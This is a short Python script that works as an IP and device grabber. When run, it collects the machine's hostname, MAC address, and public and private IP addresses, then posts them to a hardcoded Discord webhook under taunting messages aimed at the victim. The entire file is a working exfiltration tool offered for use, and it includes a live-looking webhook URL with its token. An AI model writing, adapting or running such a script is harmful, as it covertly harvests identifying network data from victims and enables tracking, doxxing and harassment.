import requests
import json
import socket
import uuid

# Replace this with the URL for your Discord webhook
WEBHOOK_URL = 'https://discord.com/api/webhooks/1087174333878780034/YoozAlgUB50HZ6X5iD5lJUnZjpvjqnVBYRqZ3Uz3Oy-P0tP0b_11WP_IxnvjzSXRuIyv'

# Get the device name and MAC address
device_name = socket.gethostname()
device_type = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big'))

# Get the public and private IP addresses
ip = requests.get('https://api.ipify.org').text
private_ip = socket.gethostbyname(socket.gethostname())

# Define the data for the embed message
data = {
    'content': '',
    'embeds': [
        {
            'title': '360 Noscoped!',
            'description': 'Get rekt noob u trash',
            'fields': [
                {
                    'name': 'IP Address',
                    'value': f'Public IP: {ip}\nPrivate IP: {private_ip}',
                    'inline': False
                },
                {
                    'name': 'Device Info',
                    'value': f'Device Name: {device_name}\nDevice Type: {device_type}',
                    'inline': False
                }
            ],
            'footer': {
                'text': 'Get fucking beamed skid'
            }
        }
    ]
}

# Send the message to the webhook
response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers={'Content-Type': 'application/json'})

# Check the response status code
if response.status_code == 204:
    print('Message sent successfully!')
else:
    print(f'Error sending message: {response.text}')
